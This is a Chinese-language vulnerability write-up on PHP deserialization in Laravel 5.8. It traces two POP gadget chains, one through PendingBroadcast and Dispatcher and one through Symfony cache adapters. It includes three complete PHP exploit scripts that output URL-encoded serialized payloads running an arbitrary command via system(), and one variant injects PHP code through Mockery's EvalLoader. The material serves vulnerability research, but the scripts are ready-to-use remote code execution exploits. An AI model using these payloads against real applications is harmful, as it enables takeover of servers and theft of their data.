# Laravel 5.8反序列化漏洞

## POP链1

`PendingBroadcast->destruct --->Dispatcher->dispatch
--->Dispatcher->dispatchToQueue`

先看Dispatcher->dispatchToQueue,只要call_user_func的参数都可控，即可执行任意命令

![image-20210322150316188.png](https://image.3001.net/images/20210322/1616414121_605885a985b9e8fa3ce7d.png!small)

再看pop链首

PendingBroadcast->__destruct

![image-20210322145748741.png](https://image.3001.net/images/20210322/1616414144_605885c0b4ce44ad7c660.png!small)

$this->events与$this->event可控。

这里需要调用Dispatcher->dispatch

![image-20210322150108131.png](https://image.3001.net/images/20210322/1616414139_605885bb9f262f201b86b.png!small)

跟进commandShouldBeQueued,只要$command属于ShouldQueue类(子类也行)即可返回true

![image-20210322150215108.png](https://image.3001.net/images/20210322/1616414134_605885b630ca330bba2fe.png!small)

跟进Dispatcher->dispatchToQueue

![image-20210322150316188.png](https://image.3001.net/images/20210322/1616414128_605885b005039e4db719a.png!small)

$this->queueResolver可控，$connection由传入的$command控制,也即是上面的$this->event,可控。

只要找到一个包含$connection属性的ShouldQueue的实现类即可执行任意代码。

先找到ShouldQueue的实现类如下

![image-20210322150959269.png](https://image.3001.net/images/20210322/1616414157_605885cd5644b75fe1d75.png!small)

这些类自身没有$connection属性，但是一些类使用的trait类Queueable中有$connection，如下

![image-20210322151345087.png](https://image.3001.net/images/20210322/1616414163_605885d38c6ae31f9e86b.png!small)

故如下类，可用

    
    
    QueuedCommand
    BroadcastEvent
    SendQueuedNotifications
    CallQueuedClosure
    

至此已可编写exp,整理一下

    
    
    PendingBroadcast->events = Dispatcher类
    PendingBroadcast->event = BroadcastEvent类		//包含$connection属性的ShouldQueue的实现类	
    
    Dispatcher->queueResolver = 要执行的函数	
    BroadcastEvent->connection = 参数	
    
    

### exp1

    
    
    <?php
    
    namespace Illuminate\Bus;
    class Dispatcher implements QueueingDispatcher{
        protected $queueResolver;
        
        public function __construct(){
            $this->queueResolver = "system";
        }
    }
    
    namespace Illuminate\Broadcasting;
    class BroadcastEvent implements ShouldQueue{
        public $connection;
        
        public function __construct($cmd){
            $this->connection  = $cmd;
        }
    }
        
    namespace Illuminate\Broadcasting;
    class PendingBroadcast{
        protected $events;
        protected $event;
        
        public function __construct($events,$event){
            $this->events = $events;
            $this->event = $event;
        }   
    }
    $broadcastevent = new Illuminate\Broadcasting\BroadcastEvent($argv[1]);
    $dispatcher = new Illuminate\Bus\Dispatcher();
    $pending = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$broadcastevent);
    
    echo urlencode(serialize($pending));
    echo "\n";
    ?>
    

![image-20210322153014172.png](https://image.3001.net/images/20210322/1616414172_605885dc7aad7d4f18398.png!small)

![image-20210322153049157.png](https://image.3001.net/images/20210322/1616414177_605885e1cc6fcb95af13c.png!small)

控制broadcastevent的$connection为要执行命令的参数即可执行命令了，其他师傅没有这么做，不是很理解原因。但是下面还是说一下其他师傅的。

利用参数可控的call_user_func可调用任意类方法，如下

![image-20210322170506940.png](https://image.3001.net/images/20210322/1616414193_605885f1a3a922afa1b0e.png!small)

故，这里可以调用EvalLoader类的load方法，如下

![image-20210322170559968.png](https://image.3001.net/images/20210322/1616414199_605885f7c80c7dc8371ff.png!small)

MockDefinition类的getCode方法返回值可控，如下

![image-20210322170724887.png](https://image.3001.net/images/20210322/1616414206_605885fe95f4b5d1440e4.png!small)

只要控制了code并且不进入if语句(使得$definition->getClassName为一个未被载入的类)，即可执行代码

跟踪getClassName方法

![image-20210322170859242.png](https://image.3001.net/images/20210322/1616414212_605886040d2745fa751ab.png!small)

全局查找返回值可控的getName方法，发现MockConfiguration类

![image-20210322170950822.png](https://image.3001.net/images/20210322/1616414218_6058860a53e6ba35bca2d.png!small)

至此可编写exp，整理一下如下

    
    
    PendingBroadcast->events = Dispatcher类
    PendingBroadcast->event = BroadcastEvent类		//包含$connection属性的ShouldQueue的实现类	
    
    Dispatcher->queueResolver = [EvalLoader类,"load"]		
    BroadcastEvent->connection = MockDefinition类	
    
    MockDefinition->config = MockConfiguration类		//任一getName返回值可控的类
    MockDefinition->code = 要执行的代码
    MockConfiguration->name = ConfigCacheCommand类	//任一未被载入的类
    

### exp2

    
    
    <?php
    
    namespace Illuminate\Bus;
    class Dispatcher{
        protected $queueResolver;
        
        public function __construct($cmd){
            $this->queueResolver = $cmd;
        }
    }
    
    namespace Illuminate\Broadcasting;
    class BroadcastEvent{
        public $connection;
        
        public function __construct($cmd){
            $this->connection  = $cmd;
        }
    }
    
    namespace Mockery\Generator;
    class MockDefinition{
    	protected $config;
    	protected $code;
    
    	public function __construct($mockconfiguration,$code){
    		$this->config = $mockconfiguration;
    		$this->code = $code;
    	}
    }
    
    namespace Mockery\Generator;
    class MockConfiguration{
    	protected $name;
    
    	public function __construct($class){
    		$this->name  = $class;
    	}
    }
    
    namespace Mockery\Loader;
    class EvalLoader{
    }
    
    namespace Illuminate\Foundation\Console;
    class ConfigCacheCommand{
    }
        
    namespace Illuminate\Broadcasting;
    class PendingBroadcast{
        protected $events;
        protected $event;
        
        public function __construct($events,$event){
            $this->events = $events;
            $this->event = $event;
        }   
    }
    $mockconfiguration = new \Mockery\Generator\MockConfiguration(new \Illuminate\Foundation\Console\ConfigCacheCommand());
    $mockdefinition = new \Mockery\Generator\MockDefinition($mockconfiguration,"<?php system($argv[1]);?>");
    $broadcastevent = new \Illuminate\Broadcasting\BroadcastEvent($mockdefinition);
    $dispatcher = new \Illuminate\Bus\Dispatcher(array(new \Mockery\Loader\EvalLoader(),"load"));
    $pending = new \Illuminate\Broadcasting\PendingBroadcast($dispatcher,$broadcastevent);
    
    echo urlencode(serialize($pending));
    echo "\n";
    ?>
    

![image-20210322164146441.png](https://image.3001.net/images/20210322/1616414270_6058863ec806f08b7e735.png!small)

## POP链2

`TagAwareAdapter->__destruct --->TagAwareAdapter->commit
--->TagAwareAdapter->invalidateTags --->ProxyAdapter->saveDeferrred
--->ProxyAdapter->doSave`

先看命令执行处

![image-20210322184259696.png](https://image.3001.net/images/20210322/1616414298_6058865a4f9e3077fa357.png!small)

若ProxyAdapter->setInnerItem、$innerItem、$item可控，则可命令执行。

回到POP链首

TagAwareAdapter->__destruct

![image-20210322184444414.png](https://image.3001.net/images/20210322/1616414304_605886606430402388d64.png!small)

跟进，TagAwareAdapter->commit

![image-20210322184505362.png](https://image.3001.net/images/20210322/1616414310_6058866683cb3c8a9d092.png!small)

跟进，TagAwareAdapter->invalidateTags(截取部分)

![image-20210322184551492.png](https://image.3001.net/images/20210322/1616414316_6058866c9fdcfc5ab9894.png!small)

令$this->pool=ProxyAdapter类

跟进ProxyAdapter->saveDeferred

![image-20210322184731962.png](https://image.3001.net/images/20210322/1616414322_6058867280d2c13770b55.png!small)

跟进ProxyAdapter->doSave

![image-20210322184813383.png](https://image.3001.net/images/20210322/1616414327_60588677361178a64e80b.png!small)

首先，$item为我们传入的参数，也即是$TagAwareAdapter->deferred,可控。

204行的if语句，只要使得$item为CacheItem的实例即可通过。

$this->setInnerItem为ProxyAdapter的属性，可控。

$innerItem可通过代码213行控制  
![image-20210322184957623.png](https://image.3001.net/images/20210322/1616414335_6058867fbb29a14c5fbd5.png!small)

至此可以编写exp，整理一下

    
    
    $TagAwareAdapter->deferred = ["4ut15m",CacheItem类]
    $TagAwareAdapter->pool = ProxyAdapter类
    
    $ProxyAdapter->setInnerItem = "system";
    $ProxyAdapter->poolHash = "4ut15m";
    
    $CacheItem->innerItem = 要执行的命令
    $CacheItem->poolHash = "4ut15m";
    

这条链并不复杂，具体的内容看exp

### exp

    
    
    <?php
    
    namespace Symfony\Component\Cache\Adapter;
    class TagAwareAdapter{
    	private $deferred;
    	private $pool;
    
    	public function __construct($obj, $obj2){
    		$this->deferred = array("4ut15m" => $obj2);
    		$this->pool = $obj;
    	}
    
    }
    
    namespace Symfony\Component\Cache;
    final class CacheItem{
    	protected $innerItem;
    	protected $poolHash;
    	public function __construct($cmd){
    		$this->innerItem = "$cmd";
    		$this->poolHash = "4ut15m";
    	}
    }
    
    namespace Symfony\Component\Cache\Adapter;
    class ProxyAdapter{
    	private $setInnerItem;
    	private $poolHash;
    	public function __construct(){
    		$this->setInnerItem = "system";
    		$this->poolHash = "4ut15m";
    	}
    }
    
    
    $cacheitem = new \Symfony\Component\Cache\CacheItem($argv[1]);
    $proxyadapter = new \Symfony\Component\Cache\Adapter\ProxyAdapter();
    
    $TagAwareAdapter = new \Symfony\Component\Cache\Adapter\TagAwareAdapter($proxyadapter, $cacheitem);
    
    echo urlencode(serialize($TagAwareAdapter));
    echo "\n";
    ?>
    

![image-20210322190147078.png](https://image.3001.net/images/20210322/1616414344_60588688cce9ef359daa8.png!small)

![image-20210322190211276.png](https://image.3001.net/images/20210322/1616414350_6058868eebc3a2ed3aaf0.png!small)

## 参考文献

[Laravel5.8.x反序列化POP链](https://mochazz.github.io/2019/08/05/Laravel5.8.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/)

